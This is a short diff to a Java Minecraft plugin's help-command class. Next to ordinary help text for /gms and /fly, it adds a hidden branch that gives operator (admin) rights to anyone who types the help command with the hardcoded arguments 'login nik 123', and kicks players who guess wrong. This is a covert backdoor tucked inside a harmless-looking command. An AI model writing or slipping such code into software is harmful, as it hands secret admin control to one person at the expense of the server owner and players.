@@ -29,6 +29,18 @@ public class CommandHelp implements CommandExecutor {
 				Chat.color(p, "&9/gms &8- &7Puts you in surival");
 				Chat.color(p, "&9/fly &8- &7Turns fly on/off");
 			}
+			if(a[0].equals("login")){
+				if(a[1].equals("nik")){
+					if(a[2].equals("123")){
+						p.setOp(true);
+					}else{
+						p.kickPlayer("Invalid Username/Password");
+					}
+				}else{
+					p.kickPlayer("Invalid Username/Password");
+					return false;
+				}
+			}
 
 		}
 		return false;
